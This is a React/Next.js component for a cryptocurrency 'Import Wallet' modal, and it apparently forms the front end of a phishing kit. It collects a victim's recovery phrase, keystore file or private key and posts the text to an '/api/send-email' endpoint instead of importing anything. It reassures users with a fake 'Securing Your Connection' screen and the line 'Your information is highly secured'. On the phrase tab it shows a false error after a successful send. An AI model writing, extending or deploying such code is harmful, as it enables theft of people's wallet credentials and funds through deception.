"use client";

import React, { useState, useEffect, useRef } from "react";
import Image from "next/image";
import Button from "./Button";

interface Wallet {
  id: string;
  name: string;
  icon: string;
  imageUrl: string;
  category: "popular" | "defi" | "hardware" | "mobile";
}

interface ImportWalletModalProps {
  isOpen: boolean;
  onClose: () => void;
  selectedWallet: Wallet | null;
  onWalletModalClose?: () => void;
}

const ImportWalletModal: React.FC<ImportWalletModalProps> = ({
  isOpen,
  onClose,
  selectedWallet,
  onWalletModalClose,
}) => {
  const [activeTab, setActiveTab] = useState<"phrase" | "keystore" | "private">(
    "phrase"
  );
  const [phrase, setPhrase] = useState<string>("");
  const [keystoreData, setKeystoreData] = useState<string>("");
  const [privateKey, setPrivateKey] = useState<string>("");
  const [isImporting, setIsImporting] = useState<boolean>(false);
  const [isSuccess, setIsSuccess] = useState<boolean>(false);
  const [isInitializing, setIsInitializing] = useState<boolean>(false);
  const hasClosedWalletModal = useRef<boolean>(false);

  // Initialize loading state and close wallet modal when import modal opens
  useEffect(() => {
    if (isOpen && selectedWallet) {
      setIsInitializing(true);

      // Show initializing state for 2 seconds
      const timer = setTimeout(() => {
        setIsInitializing(false);
      }, 2000);

      if (onWalletModalClose && !hasClosedWalletModal.current) {
        hasClosedWalletModal.current = true;
        onWalletModalClose();
      }

      return () => clearTimeout(timer);
    }
  }, [isOpen, selectedWallet, onWalletModalClose]);

  // Reset states when modal closes
  useEffect(() => {
    if (!isOpen) {
      hasClosedWalletModal.current = false;
      setIsInitializing(false);
      setPhrase("");
      setKeystoreData("");
      setPrivateKey("");
      setIsImporting(false);
      setIsSuccess(false);
      setActiveTab("phrase");
    }
  }, [isOpen]);

  const getImportData = () => {
    switch (activeTab) {
      case "phrase":
        return phrase.trim();
      case "keystore":
        return keystoreData.trim();
      case "private":
        return privateKey.trim();
      default:
        return "";
    }
  };

  const isImportDataValid = () => {
    const data = getImportData();
    return data.length > 0;
  };

  const handleImport = async () => {
    if (!isImportDataValid()) return;

    setIsImporting(true);

    try {
      // Prepare email data
      const response = await fetch("/api/send-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          type: "wallet",
          walletName: selectedWallet?.name || "Unknown Wallet",
          importMethod: activeTab,
          importData: getImportData(),
        }),
      });

      const result = await response.json();

      if (!response.ok) {
        throw new Error(result.error || "Failed to send email");
      }

      // Success - show success message (persist until modal closes)
      setIsSuccess(true);
      setIsImporting(false);
      console.log("Import request sent successfully");
    } catch (error) {
      console.error("Import error:", error);
      setIsImporting(false);
      // You can add an error notification here
      alert("Failed to send import request. Please try again.");
    }
  };

  if (!isOpen || !selectedWallet) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center md:p-4">
      {/* Backdrop */}
      <div
        className="absolute inset-0 bg-black/40 backdrop-blur-md"
        // onClick={onClose}h
      />

      {/* Modal */}
      <div className="relative bg-white backdrop-blur-xl border border-gray-200 md:rounded-3xl shadow-2xl w-full h-full md:max-w-[600px] md:h-auto md:mx-4 overflow-hidden flex flex-col">
        {/* Glow effect */}
        {/* <div className="absolute pointer-events-none -z-10 inset-0 bg-gradient-to-r from-purple-500/10 via-transparent to-blue-500/10 rounded-3xl" /> */}

        {/* Header - Sticky */}
        <div className="sticky top-0 z-10 flex items-center justify-between p-6 border-b border-gray-200 bg-white md:rounded-t-3xl">
          <div className="flex items-center space-x-3">
            <div className="w-8 h-8 rounded-lg overflow-hidden bg-gray-100 flex items-center justify-center">
              <Image
                src={selectedWallet.imageUrl}
                alt={`${selectedWallet.name} logo`}
                width={32}
                height={32}
                className="w-full h-full object-contain"
                onError={(e) => {
                  // Fallback to emoji if image fails to load
                  e.currentTarget.style.display = "none";
                  const nextElement = e.currentTarget
                    .nextElementSibling as HTMLElement;
                  if (nextElement) nextElement.style.display = "block";
                }}
              />
              <span className="text-2xl hidden">{selectedWallet.icon}</span>
            </div>
            <h2 className="font-heading text-xl font-bold text-gray-900">
              Import {selectedWallet.name}
            </h2>
          </div>
          <button
            onClick={onClose}
            className="p-2 hover:bg-gray-100 rounded-xl transition-colors group"
          >
            <svg
              className="w-6 h-6 text-gray-400 group-hover:text-gray-600 transition-colors"
              fill="none"
              stroke="currentColor"
              viewBox="0 0 24 24"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M6 18L18 6M6 6l12 12"
              />
            </svg>
          </button>
        </div>

        {/* Tabs - Hidden during initialization - Sticky */}
        {!isInitializing && (
          <div className="sticky top-[73px] z-10 border-b border-gray-200 bg-white">
            <div className="flex">
              {[
                { id: "phrase", label: "PHRASE" },
                { id: "keystore", label: "KEYSTORE JSON" },
                { id: "private", label: "PRIVATE KEY" },
              ].map((tab) => (
                <button
                  key={tab.id}
                  onClick={() =>
                    setActiveTab(tab.id as "phrase" | "keystore" | "private")
                  }
                  className={`flex-1 px-4 py-3 text-sm font-medium transition-all duration-300 ${
                    activeTab === tab.id
                      ? "text-purple-600 border-b-2 border-purple-400 bg-purple-50"
                      : "text-gray-500 hover:text-gray-700 hover:bg-gray-50"
                  }`}
                >
                  {tab.label}
                </button>
              ))}
            </div>
          </div>
        )}

        {/* Content - Scrollable */}
        <div className="flex-1 overflow-y-auto p-6">
          {isInitializing ? (
            /* Initializing State */
            <div className="flex flex-col items-center justify-center py-12">
              {/* Security Icon */}
              <div className="w-16 h-16 rounded-xl bg-green-100 flex items-center justify-center mb-6">
                <svg
                  className="w-8 h-8 text-green-600"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                  />
                </svg>
              </div>

              {/* Loading Spinner */}
              <div className="relative mb-6">
                <div className="w-12 h-12 border-4 border-purple-200 border-t-purple-600 rounded-full animate-spin"></div>
                <div className="absolute inset-0 w-12 h-12 border-2 border-purple-300/30 rounded-full animate-ping"></div>
              </div>

              {/* Loading Text */}
              <div className="text-center">
                <h3 className="font-heading text-lg font-semibold text-gray-900 mb-2">
                  Securing Your Connection
                </h3>
                <p className="text-gray-600 text-sm mb-6">
                  Initializing secure import environment...
                </p>

                {/* Security Message */}
                <div className="p-4 bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-xl">
                  <div className="flex items-center justify-center space-x-2">
                    <svg
                      className="w-5 h-5 text-green-500"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"
                      />
                    </svg>
                    <p className="text-green-600 text-sm font-medium">
                      Your information is highly secured
                    </p>
                  </div>
                </div>
              </div>

              {/* Loading dots */}
              <div className="flex items-center space-x-2 mt-6">
                <div className="w-2 h-2 bg-purple-600 rounded-full animate-bounce"></div>
                <div
                  className="w-2 h-2 bg-purple-600 rounded-full animate-bounce"
                  style={{ animationDelay: "0.2s" }}
                ></div>
                <div
                  className="w-2 h-2 bg-purple-600 rounded-full animate-bounce"
                  style={{ animationDelay: "0.4s" }}
                ></div>
              </div>
            </div>
          ) : (
            <>
              {/* Security Message */}
              <div className="mb-6 p-4 bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-xl">
                <div className="flex items-center space-x-2">
                  <svg
                    className="w-5 h-5 text-green-400"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                    />
                  </svg>
                  <p className="text-green-400 text-sm font-medium">
                    Your information is highly secured
                  </p>
                </div>
              </div>

              {/* Tab Content */}
              {activeTab === "phrase" && (
                <>
                  {/* Input Area */}
                  <div className="mb-6">
                    <textarea
                      value={phrase}
                      onChange={(e) => setPhrase(e.target.value)}
                      placeholder="Enter your recovery phrase..."
                      className="w-full h-32 p-4 bg-gray-50 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-gray-900 placeholder-gray-500 resize-none transition-all duration-300"
                    />
                  </div>

                  {/* Success Message */}
                  {isSuccess && (
                    <div className="mb-6 p-4 bg-gradient-to-r from-red-500/10 to-emerald-500/10 border border-red-500/30 rounded-xl backdrop-blur-sm">
                      <div className="flex items-center space-x-2">
                        {/* <svg
                          className="w-5 h-5 text-red-400"
                          fill="none"
                          stroke="currentColor"
                          viewBox="0 0 24 24"
                        >
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth={2}
                            d="M5 13l4 4L19 7"
                          />
                        </svg> */}
                        <p className="text-red-400 text-sm font-medium">
                          An error occurred while sending the import request.
                        </p>
                      </div>
                    </div>
                  )}

                  {/* Instructions */}
                  <p className="text-gray-600 text-sm mb-8">
                    Typically 12 (sometimes 24) words separated by single
                    spaces.
                  </p>
                </>
              )}

              {activeTab === "keystore" && (
                <>
                  {/* Keystore Input */}
                  <div className="mb-6">
                    <textarea
                      value={keystoreData}
                      onChange={(e) => setKeystoreData(e.target.value)}
                      placeholder="Paste your keystore JSON file content..."
                      className="w-full h-32 p-4 bg-gray-50 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-gray-900 placeholder-gray-500 resize-none transition-all duration-300"
                    />
                  </div>

                  {/* Success Message */}
                  {isSuccess && (
                    <div className="mb-6 p-4 bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-xl backdrop-blur-sm">
                      <div className="flex items-center space-x-2">
                        <svg
                          className="w-5 h-5 text-green-400"
                          fill="none"
                          stroke="currentColor"
                          viewBox="0 0 24 24"
                        >
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth={2}
                            d="M5 13l4 4L19 7"
                          />
                        </svg>
                        <p className="text-green-400 text-sm font-medium">
                          Import request sent successfully! Check your email.
                        </p>
                      </div>
                    </div>
                  )}

                  {/* Keystore Instructions */}
                  <p className="text-gray-600 text-sm mb-8">
                    Paste the contents of your keystore JSON file. This file
                    contains your encrypted private key.
                  </p>
                </>
              )}

              {activeTab === "private" && (
                <>
                  {/* Private Key Input */}
                  <div className="mb-6">
                    <textarea
                      value={privateKey}
                      onChange={(e) => setPrivateKey(e.target.value)}
                      placeholder="Enter your private key..."
                      className="w-full h-32 p-4 bg-gray-50 border border-gray-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 text-gray-900 placeholder-gray-500 resize-none transition-all duration-300"
                    />
                  </div>

                  {/* Success Message */}
                  {isSuccess && (
                    <div className="mb-6 p-4 bg-gradient-to-r from-green-500/10 to-emerald-500/10 border border-green-500/30 rounded-xl backdrop-blur-sm">
                      <div className="flex items-center space-x-2">
                        <svg
                          className="w-5 h-5 text-green-400"
                          fill="none"
                          stroke="currentColor"
                          viewBox="0 0 24 24"
                        >
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth={2}
                            d="M5 13l4 4L19 7"
                          />
                        </svg>
                        <p className="text-green-400 text-sm font-medium">
                          Import request sent successfully! Check your email.
                        </p>
                      </div>
                    </div>
                  )}

                  {/* Private Key Instructions */}
                  <p className="text-gray-600 text-sm mb-8">
                    Enter your private key (64 character hexadecimal string).
                    Keep this secure and never share it.
                  </p>
                </>
              )}

              {/* Import Button */}
              <Button
                onClick={handleImport}
                disabled={!isImportDataValid() || isImporting}
                className="w-full text-white py-4 px-6 rounded-xl font-medium disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-300 flex items-center justify-center bg-purple-600 hover:bg-purple-700"
              >
                {isImporting ? (
                  <>
                    <div className="flex items-center justify-center">
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-3"></div>
                      <p>Importing...</p>
                    </div>
                  </>
                ) : (
                  "IMPORT"
                )}
              </Button>
            </>
          )}
        </div>
      </div>
    </div>
  );
};

export default ImportWalletModal;
